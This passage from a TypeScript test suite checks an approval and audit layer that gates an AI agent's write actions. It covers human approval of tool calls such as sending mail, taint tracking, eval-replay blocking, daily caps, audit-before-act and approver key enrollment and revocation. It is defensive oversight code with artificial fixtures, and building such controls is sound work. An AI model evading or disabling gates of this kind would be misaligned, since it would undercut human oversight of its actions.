    const approved = (await (await fetch(`${base()}/approvals/enroll/approved?challengeId=${String(ap.body.challengeId)}`)).json()) as { approved: boolean };
    expect(approved.approved).toBe(true);
    const fin = await post('/approvals/enroll/finish', { ...reg, approval: { challengeId: ap.body.challengeId } });
    expect(fin.status).toBe(200);
    expect(mem.creds.map((c) => c.enrolledVia)).toEqual(['enroll_code', expect.stringMatching(/^approval:/)]);
    server?.close();
  });
});

// ---- the second review: what the fixes themselves got wrong ----------------------------------

describe('second review of #41', () => {
  const promoted = (pattern: string, dailyCap = 1) => () => [{ pattern, tier: 'alone' as const, dailyCap, active: true, expiresAt: '2099-01-01T00:00:00Z' }];

  it('an eval replay runs no write, promoted or not, and claims no cap', async () => {
    let claims = 0;
    const [w] = gateBuiltins([tool('ledger_record_prediction', () => 'written')], { queue: new ActionQueue(isSafeTool), policies: promoted('ledger_record_prediction', 5), claimCap: async () => (claims++, 'ok') });
    const out = (await withTurnTaint(async () => (markEval(), w!.handler({ id: '1', toolName: 'ledger_record_prediction', args: {} })))) as { approved: boolean; message: string };
    expect(out).toMatchObject({ approved: false, message: expect.stringMatching(/eval replay/) });
    expect(claims).toBe(0);
  });

  it('an approved call runs on its approval: the cap the runtime took is not taken again', async () => {
    let claims = 0;
    let ran = 0;
    const queue = new ActionQueue(isSafeTool);
    const [w] = gateBuiltins([tool('ledger_record_prediction', () => (ran++, 'written'))], { queue, policies: promoted('ledger_record_prediction', 1), claimCap: async () => (claims++, 'capped') });
    const proposal = { id: 'pr7', origin: 'chat:t', action: 'ledger_record_prediction', args: { c: 1 }, tainted: false, status: 'approved' };
    const rt = fakeRuntime(proposal);
    const proposals = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl: rt.fetchImpl });
    const out = await executeApproved({ actions: queue, tools: [w!], audit: { record: () => ({}) } as unknown as ApprovalDeps['audit'], notes: { push: () => undefined } as unknown as ApprovalDeps['notes'], approvals: undefined, proposals, errorRef: () => 'r' }, 'pr7');
    expect(out.status).toBe('done');
    expect(ran).toBe(1);
    expect(claims).toBe(0);
  });

  it('the runtime gets the failure\'s class, never the tool\'s words; a result is stored clean and bounded', async () => {
    const proposal = { id: 'pr8', origin: 'chat:t', action: 'mcp:gmail.send', args: {}, tainted: false, status: 'approved' };
    const bodies: Array<Record<string, unknown>> = [];
    const base = fakeRuntime(proposal);
    const fetchImpl = (async (u: string, init: RequestInit = {}) => {
      if (u.endsWith('/complete')) {
        const b = JSON.parse(String(init.body)) as Record<string, unknown>;
        bodies.push(b);
        // An ok result the runtime will not store: refused, then the bare fact is accepted.
        if (b.ok && b.result) return Response.json({ error: 'too large' }, { status: 413 });
        return Response.json({ ok: true });
      }
      return base.fetchImpl(u, init);
    }) as typeof fetch;
    const proposals = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl });
    const deps = (t: Tool) => ({ actions: new ActionQueue(isSafeTool), tools: [t], audit: { record: () => ({}) } as unknown as ApprovalDeps['audit'], notes: { push: () => undefined } as unknown as ApprovalDeps['notes'], approvals: undefined, proposals, errorRef: () => 'r' });
    const failed = await executeApproved(deps(tool('gmail.send', () => ({ isError: true, content: '550 bob@example.com rejected' }))), 'pr8');
    expect(failed).toMatchObject({ status: 'error', error: '550 bob@example.com rejected' });
    expect(bodies[0]).toEqual({ ok: false, error: 'the tool reported an error' });
    const ok = await executeApproved(deps(tool('gmail.send', () => 'sent\u0000')), 'pr8');
    expect(ok.status).toBe('done');
    expect(ok.note).toBeUndefined();
    expect(bodies.slice(1)).toEqual([{ ok: true, result: { value: 'sent' } }, { ok: true }]);
    const { storable } = await import('../src/approval-routes');
    expect(storable({ t: 'a\uD83D' })).toEqual({ t: 'a�' });
    expect(storable('x'.repeat(20_000))).toMatchObject({ truncated: true });
  });

  it('a write whose intent cannot be recorded does not run', async () => {
    const sink = new AuditSink({ spoolDir: tmp(), maxBytes: 10 });
    let ran = 0;
    const [r] = gateBuiltins([tool('remember', () => (ran++, 'ok'))], {
      queue: new ActionQueue(isSafeTool),
      onDecision: (e) => void sink.record({ actor: 'flint', context: 'chat', kind: 'decision', action: e.decision.key, inputs: {}, outcome: 'pending' }, e.status === 'acting'),
    });
    await expect(withTurnTaint(() => r!.handler({ id: '1', toolName: 'remember', args: { fact: 'x' } }))).rejects.toThrow(AuditUnavailable);
    expect(ran).toBe(0);
  });

  it('a call queued while the runtime was down and refused when it got there is reported', async () => {
    const dir = tmp();
    let up = false;
    const refused: unknown[] = [];
    const fetchImpl = (async () => (up ? Response.json({ error: 'body too large' }, { status: 413 }) : Promise.reject(new Error('down')))) as typeof fetch;
    const p = new RuntimeProposals({ runtime: () => RT, spoolDir: dir, fetchImpl, onRefused: (x) => refused.push(x) });
    const r = await p.propose({ kind: 'tool_call', origin: 'chat:x', action: 'mcp:gmail.send', args: {}, argsProvenance: {}, tainted: true });
    expect(r).toMatchObject({ spooled: true, spoolId: expect.stringMatching(/^[0-9a-f]{16}$/) });
    up = true;
    await p.replay();
    expect(refused).toEqual([{ action: 'mcp:gmail.send', spoolId: (r as { spoolId: string }).spoolId, tainted: true, reason: 'body too large' }]);
  });

  it('a replace code keeps an already-enrolled key and revokes the rest in one step; a revoked key cannot come back', async () => {
    const dir = tmp();
    const code = join(dir, 'code');
    const creds: Array<Credential & { enrolledVia: string }> = [];
    const replaced: Array<[string | undefined, readonly string[]]> = [];
    const store: ApproverStore = {
      credentials: async () => creds,
      addCredential: async (c) => void creds.push({ ...c, revokedAt: null }),
      addApproval: async () => {},
      setSignCount: async () => {},
      revoke: async () => {},
      replace: async (add, revoke) => {
        replaced.push([add?.credentialId, revoke]);
        if (add) creds.push({ ...add, revokedAt: null });
        for (const c of creds) if (revoke.includes(c.credentialId)) c.revokedAt = new Date();
      },
    };
    const ap = new Approvals({ store, enrollCodeFile: code });
    const key = () => {
      const k = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
      return { pub: k.publicKey.export({ format: 'der', type: 'spki' }).toString('base64url'), sign: (c: string) => signRaw('sha256', Buffer.from(c, 'base64url'), k.privateKey).toString('base64url') };
    };
    const mac = key();
    const enrol = async (k: ReturnType<typeof key>, c: string) => {
      writeFileSync(code, `${c}\n`);
      const b = await ap.beginEnroll({ code: c.split(' ')[0], label: 'k' });
      return ap.finishEnroll({ challengeId: b.challengeId, factor: 'secure_enclave', publicKey: k.pub, signature: k.sign(b.challenge) });
    };
    await enrol(mac, 'abcd-efgh-ijkl-mnop');
    creds.push({ credentialId: 'phone', factor: 'webauthn', publicKey: Buffer.alloc(1), label: 'phone', signCount: 0, revokedAt: null, enrolledVia: 'approval:x' });
    // The Mac's own working key, with a replace code: kept, the phone revoked.
    await enrol(mac, 'rplc-0000-1111-2222 replace');
    expect(replaced).toEqual([[undefined, ['phone']]]);
    expect(creds.filter((c) => !c.revokedAt).map((c) => c.label)).toEqual(['k']);
    // Enrolling a live key again is refused; a revoked key cannot come back (a new one is made instead).
    await expect(enrol(mac, 'zzzz-0000-1111-2222 replace')).resolves.toBeDefined(); // replace with itself: no-op
    creds.push({ credentialId: 'other', factor: 'webauthn', publicKey: Buffer.alloc(1), label: 'other', signCount: 0, revokedAt: null, enrolledVia: 'approval:y' });
    await expect(enrol(mac, 'yyyy-0000-1111-2222')).rejects.toThrow(/already enrolled/);
    creds.find((c) => c.label === 'k')!.revokedAt = new Date();
    await expect(enrol(mac, 'xxxx-0000-1111-2222 replace')).rejects.toThrow(/was revoked/);
  });

  it('a second key with a long credential id can be approved (the approval names a fixed-length reference)', async () => {
    const { credentialRef } = await import('../src/approvals');
    expect(credentialRef('x'.repeat(1300))).toMatch(/^[0-9a-f]{64}$/);
  });
});
